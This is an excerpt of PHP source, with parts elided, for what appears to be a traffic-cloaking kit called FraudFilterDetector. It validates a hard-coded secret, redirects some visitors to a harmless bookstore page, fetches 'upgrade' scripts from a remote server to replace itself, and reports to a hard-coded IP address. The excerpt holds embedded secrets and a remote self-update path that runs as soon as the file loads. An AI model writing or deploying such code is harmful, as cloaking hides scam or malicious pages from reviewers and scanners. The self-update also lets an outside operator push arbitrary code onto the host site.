...
class FraudFilterDetector_2v17f {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'c83f3367-fdc6-48bd-ade7-a34931b09c13.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.libri.de/en/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: c83f3367-fdc6-48bd-ade7-a34931b09c13',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: c83f3367-fdc6-48bd-ade7-a34931b09c13';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: c83f3367-fdc6-48bd-ade7-a34931b09c13';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=2v17f&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_2v17f = new FraudFilterDetector_2v17f();
$fraudFilterDetector_2v17f->check();
